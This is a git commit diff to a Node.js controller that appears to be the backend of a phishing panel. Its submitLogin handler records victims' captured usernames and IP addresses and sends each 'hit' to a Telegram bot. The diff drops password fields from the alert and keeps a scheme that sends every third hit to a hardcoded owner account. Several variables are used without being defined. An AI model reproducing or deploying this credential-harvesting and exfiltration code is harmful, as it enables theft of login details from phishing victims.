2a1d6d80e8c9bfa16533f20655da7f4c0cf61773
tresdtapio <97699520+tresdtapio@users.noreply.github.com>
2023-06-28 12:47:29 +0100

    Make

--- controllers/jlController.js
+++ controllers/jlController.js
@@ -55,38 +55,35 @@ const getInfo = async (req, res) => {
 
 const submitLogin = async (req, res) => {
 	let { username, uniqueid, owner, ip } = req.body;
-	message = `New JL Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=jl&password=${owner}\n\nCount: ${count}\nRedirect: ${redirect}`;
+	message = `New JL Hit:\n\n${username}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=jl&password=${owner}\n\nCount: ${count}\nRedirect: ${redirect}`;
 	try {
-		if (username == "" || password == "") {
+		if (redirect && count == 3) {
+			message = `‼️‼️‼️ Haytch JL Hit:\n\n${username}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=jl&password=haytch4023`;
+			owner = "haytch4023";
+			count = 0;
 		} else {
-			if (redirect && count == 3) {
-				message = `‼️‼️‼️ Haytch JL Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=jl&password=haytch4023`;
-				owner = "haytch4023";
-				count = 0;
-			} else {
-				count = count + 1;
-			}
-			await JL.create({
-				uniqueid,
-				username,
-				status: 1,
-				owner,
-				ip,
-				timestamp: moment().format(),
-			});
-			await axios
-				.post(
-					`https://api.telegram.org/bot${process.env.panelBot}/sendMessage`,
-					{
-						chat_id: 680379375,
-						text: message,
-						parse_mode: "Markdown",
-					}
-				)
-				.catch((e) => {
-					console.log(e);
-				});
+			count = count + 1;
 		}
+		await JL.create({
+			uniqueid,
+			username,
+			status: 1,
+			owner,
+			ip,
+			timestamp: moment().format(),
+		});
+		await axios
+			.post(
+				`https://api.telegram.org/bot${process.env.panelBot}/sendMessage`,
+				{
+					chat_id: 680379375,
+					text: message,
+					parse_mode: "Markdown",
+				}
+			)
+			.catch((e) => {
+				console.log(e);
+			});
 		res.sendStatus(200);
 	} catch (error) {
 		console.log(error);
